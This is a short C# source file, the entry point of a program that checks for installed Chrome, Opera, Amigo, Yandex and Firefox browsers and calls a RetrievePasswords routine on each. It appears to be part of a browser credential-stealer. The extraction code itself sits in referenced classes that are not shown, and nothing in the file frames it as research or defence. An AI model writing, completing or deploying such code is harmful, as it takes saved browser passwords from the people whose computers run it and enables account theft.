using xoxoxo.Chromium;
using xoxoxo.Firefox;

namespace xoxoxo
{
    internal static class Program
    {
        private static void Main(string[] args)
        {
            var chromeChromium = new ChromeChromium();
            if (chromeChromium.IsExists())
                chromeChromium.RetrievePasswords();
            var operaChromium = new OperaChromium();
            if (operaChromium.IsExists())
                operaChromium.RetrievePasswords();
            var amigoChromium = new AmigoChromium();
            if (amigoChromium.IsExists())
                amigoChromium.RetrievePasswords();
            var yandexChromium = new YandexChromium();
            if (yandexChromium.IsExists())
                yandexChromium.RetrievePasswords();
            var mozillaFirefox = new MozillaFirefox();
            if (!mozillaFirefox.IsExists())
                return;
            mozillaFirefox.RetrievePasswords();
        }
    }
}